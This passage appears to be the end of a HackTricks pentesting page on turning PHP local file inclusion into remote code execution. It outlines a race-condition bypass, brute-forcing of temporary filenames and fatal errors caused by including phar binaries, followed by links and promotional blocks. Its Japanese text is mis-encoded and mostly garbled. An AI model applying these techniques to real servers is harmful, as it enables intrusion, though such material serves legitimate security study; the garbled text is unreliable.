**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã€**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’å¤–éƒ¨ã«æ¼æ´©ã§ãã‚‹**ãŒã€**ã‚µãƒ¼ãƒãƒ¼**ãŒ**ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã«PHPãƒãƒ¼ã‚¯ãŒã‚ã‚‹ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹**å ´åˆã€ã“ã®**ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³**ã‚’ä½¿ç”¨ã—ã¦**ãã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹**ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

LFIã‚’æ‚ªç”¨ã—ã¦**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€ã‚µãƒ¼ãƒãƒ¼ãŒPHPå®Ÿè¡Œã‚’**ãƒãƒ³ã‚°**ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆã€**æ•°æ™‚é–“ã«ã‚ãŸã£ã¦ãƒ•ã‚¡ã‚¤ãƒ«åã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã—ã¦ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

`/usr/bin/phar`ã€`/usr/bin/phar7`ã€`/usr/bin/phar.phar7`ã€`/usr/bin/phar.phar`ã®ã„ãšã‚Œã‹ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¾ã™ã€‚ï¼ˆãã®ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™ã«ã¯ã€åŒã˜ã‚‚ã®ã‚’2å›ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

**ã“ã‚ŒãŒã©ã®ã‚ˆã†ã«å½¹ç«‹ã¤ã®ã‹ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ãŒã€å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**\
_ãŸã¨ãˆPHPã®è‡´å‘½çš„ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã—ã¦ã‚‚ã€ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸPHPã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯å‰Šé™¤ã•ã‚Œã¾ã™ã€‚_

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
